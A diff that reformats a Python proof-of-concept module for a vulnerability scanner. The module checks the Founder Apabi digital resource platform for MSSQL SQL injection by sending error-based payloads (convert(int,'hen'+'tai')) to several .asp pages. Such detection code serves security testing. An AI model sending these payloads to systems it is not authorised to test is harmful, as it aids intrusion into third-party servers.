@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Founder_0004' # 平台漏洞编号，留空
+    vuln_id = 'Founder_0004'  # 平台漏洞编号，留空
     name = '方正Apabi数字资源平台MSSQL SQL注射'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-03-26'  # 漏洞公布时间
     desc = '''
         方正Apabi数字资源平台：
@@ -23,6 +24,7 @@ class Vuln(ABVuln):
     product = '方正Apabi数字资源平台'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = 'faea57ef-9d77-4127-b17c-933ad181d501'
     author = '47bwy'  # POC编写者
@@ -35,12 +37,12 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
-            #No.3 http://www.wooyun.org/bugs/wooyun-2010-0102763
-            #No.4 http://www.wooyun.org/bugs/wooyun-2010-0102829
-            #No.5 http://www.wooyun.org/bugs/wooyun-2010-0102760
-            #No.6 http://www.wooyun.org/bugs/wooyun-2010-0102822
+            # No.3 http://www.wooyun.org/bugs/wooyun-2010-0102763
+            # No.4 http://www.wooyun.org/bugs/wooyun-2010-0102829
+            # No.5 http://www.wooyun.org/bugs/wooyun-2010-0102760
+            # No.6 http://www.wooyun.org/bugs/wooyun-2010-0102822
             payloads = [
                 "/dlib/dir.asp?lang=gb&DocID=convert%28int,%27hen%27%2b%27tai%27%29",
                 "/tree/deeptree.asp?DocGroupID=convert%28int,%27hen%27%2b%27tai%27%29&hide=1&CategoryTypeID=1",
@@ -51,7 +53,7 @@ class Poc(ABPoc):
                 url = self.target + payload
                 code, head, body, errcode1, final_url = hh.http(url)
                 if 'hentai' in body:
-                    #security_hole(arg+payload)
+                    # security_hole(arg+payload)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞，，漏洞地址为{url}'.format(
                         target=self.target, name=self.vuln.name, url=url))
 
@@ -60,6 +62,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
